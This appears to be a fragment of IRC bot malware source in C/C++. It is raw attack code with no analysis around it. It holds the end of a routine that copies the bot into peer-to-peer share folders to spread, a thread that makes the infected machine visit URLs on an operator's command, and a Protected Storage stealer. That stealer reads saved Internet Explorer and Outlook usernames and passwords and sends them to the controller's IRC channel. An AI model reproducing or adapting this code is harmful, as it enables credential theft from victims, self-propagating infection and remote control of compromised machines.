			sprintf( p2pfolder, "%s\\%s",szBuf,szPath[i]);
			strcpy(pP2PInfo_s->szFilePath, p2pfolder);
			strcat(pP2PInfo_s->szFilePath, szFiles[j]);
			if (CopyFile(pP2PInfo_s->szDirectory, pP2PInfo_s->szFilePath, false) != 0) 
			{ 
				SetFileAttributes(pP2PInfo_s->szFilePath, FILE_ATTRIBUTE_NORMAL);    
			} 
		}
	}
	delete pP2PInfo_s;
	return true;
}
#endif

////****


#ifndef NO_VISIT

DWORD WINAPI VisitThread(LPVOID param)
{
	HINTERNET ch = 0, req = 0;

	const char *accept = "*/*";
	char vhost[128], vuser[128], vpass[128], vpath[256], sendbuf[IRCLINE];

	NTHREAD visit = *((NTHREAD *)param);
	NTHREAD *visits = (NTHREAD *)param;
	IRC* irc=(IRC*)visit.conn;
	visits->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	URL_COMPONENTS url;
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!fInternetCrackUrl(visit.data1, strlen(visit.data1), 0, &url)) {
			sprintf(sendbuf,"%s Invalid URL.", visit_title);
			break;
		}

		// copy url parts into variables
		if (url.dwHostNameLength > 0) 
			strncpy(vhost, url.lpszHostName, url.dwHostNameLength);

		int vport = url.nPort;
		if (url.dwUserNameLength > 0) 
			strncpy(vuser, url.lpszUserName, url.dwUserNameLength);

		if (url.dwPasswordLength > 0) 
			strncpy(vpass, url.lpszPassword, url.dwPasswordLength);

		if (url.dwUrlPathLength > 0) 
			strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);


		ch = fInternetConnect(ih, vhost,(unsigned short)vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			sprintf(sendbuf,"%s Could not open a connection.", visit_title);
			break;
		}

		req = fHttpOpenRequest(ch, NULL, vpath, NULL, visit.data2, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			sprintf(sendbuf,"%s Failed to connect to HTTP server.", visit_title);
			break;
		}

		if (fHttpSendRequest(req, NULL, 0, NULL, 0))
			sprintf(sendbuf,"%s URL visited.", visit_title);
		else
			sprintf(sendbuf,"%s Failed to get requested URL from HTTP server.", visit_title);		
	} while(0);

	if (!visit.silent) irc->pmsg(visit.target,sendbuf);

	fInternetCloseHandle(ch);
	fInternetCloseHandle(req);

	clearthread(visit.threadnum);

	ExitThread(0);

	return 0;
}
#endif
//********
    //////////////////////////////////////////////////////////////////////////////
	//                               Pstore
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PSTORE

void __stdcall _com_issue_errorex(long,struct IUnknown *,struct _GUID const &)
{
    return;
}
void __stdcall _com_issue_error(long)
{
    return;
}

DWORD WINAPI pstore (LPVOID param)
{
    typedef HRESULT (__stdcall *PSCI)(IPStore **, DWORD, DWORD, DWORD);

    NTHREAD pStorInfoX = *((NTHREAD *)param);
    NTHREAD *pStorInfoXs = (NTHREAD *)param;
    pStorInfoXs->gotinfo = TRUE;
    IRC* irc=(IRC*)pStorInfoX.conn;
    char *searchparam = NULL;
    GUID TypeGUID;
    char szItemName[512];
    char szItemData[512];
    char szResName[1512];
    char szResData[512];
    char szItemGUID[50];
    PSCI fPStoreCreateInstance;
    int iSent=0;
    IPStorePtr PStore;


    if (pStorInfoX.bdata1 == TRUE)
        searchparam = pStorInfoX.data1;
    else
        searchparam = NULL;


    HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll)
        fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");
    else {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}


    HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
    
	if (FAILED(hRes)) {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}

    IEnumPStoreTypesPtr EnumPStoreTypes;
    hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
    
	if (FAILED(hRes)) {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}
	irc->pmsg(Decode(infochan),"%s starting PStore", main_title);
	
    while (EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
    {
        wsprintf(szItemGUID,"%x",TypeGUID);
        IEnumPStoreTypesPtr EnumSubTypes;
        hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);
        GUID subTypeGUID;
        while (EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
        {
            IEnumPStoreItemsPtr spEnumItems;
            HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);
            LPWSTR itemName;
            while (spEnumItems->raw_Next(1,&itemName,0) == S_OK)
            {
                wsprintf(szItemName,"%ws",itemName);
                char chekingdata[200];
                unsigned long psDataLen = 0;
                unsigned char *psData = NULL;
                _PST_PROMPTINFO *pstiinfo = NULL;
                hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
                if (lstrlen((char *)psData),(psDataLen-1))
                {
                    int i=0;
                    for (unsigned int m = 0;m<psDataLen;m+=2)
                    {
                        if (psData[m]==0)
                            szItemData[i]=',';
                        else
                            szItemData[i]=psData[m];
                        i++;
                    }
                    szItemData[i-1]=0;
                }
                else
                {
                    wsprintf(szItemData,"%s",psData);
                }
                lstrcpy(szResName,"");
                lstrcpy(szResData,"");
                if (lstrcmp(szItemGUID,"5e7e8100")==0)
                {
                    lstrcpy(chekingdata,"");
                    if (strstr(szItemData,":")!=0)
                    {
                        lstrcpy(chekingdata,strstr(szItemData,":")+1);
                        *(strstr(szItemData,":"))=0;
                    }
                    iSent++;
                    if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
                        if (searchparam != NULL)
                        {
							if (strstr(szItemName, searchparam))
								irc->pmsg(Decode(infochan), "%s %s %s:%s", pstore_title, szItemName, szItemData, chekingdata);
                        }
                        else
                            irc->pmsg(Decode(infochan), "%s %s %s:%s",  pstore_title, szItemName, szItemData, chekingdata);
                }
                if (!lstrcmp(szItemGUID,"e161255a"))
                {
                    if (strstr(szItemName,"StringIndex")==0)
                    {
                        if (strstr(szItemName,":String")!=0)
                            *strstr(szItemName,":String")=0;
                        lstrcpyn(chekingdata,szItemName,8);
                        if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
                        {
                            lstrcpy(chekingdata,"");
                            if (strstr(szItemData,",")!=0)
                            {
                                lstrcpy(chekingdata,strstr(szItemData,",")+1);
                                *(strstr(szItemData,","))=0;
                            }
                            iSent++;
                            if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))

                                if (searchparam != NULL)
                                {
                                    if (strstr(szItemName, searchparam))
                                        irc->pmsg(Decode(infochan), "%s %s %s:%s",  pstore_title, szItemName, szItemData, chekingdata);
                                }
                                else
									irc->pmsg(Decode(infochan), "%s %s %s:%s",  pstore_title, szItemName, szItemData, chekingdata);
                        }
                    }
                }
                ZeroMemory(szItemName,sizeof(szItemName));
                ZeroMemory(szItemData,sizeof(szItemData));
                Sleep (1000);
            }
        }
    }
	
	irc->pmsg(Decode(infochan), "%s End of PStore", main_title);
	clearthread(pStorInfoX.threadnum);
	ExitThread(0);
    return 0;
}
#endif

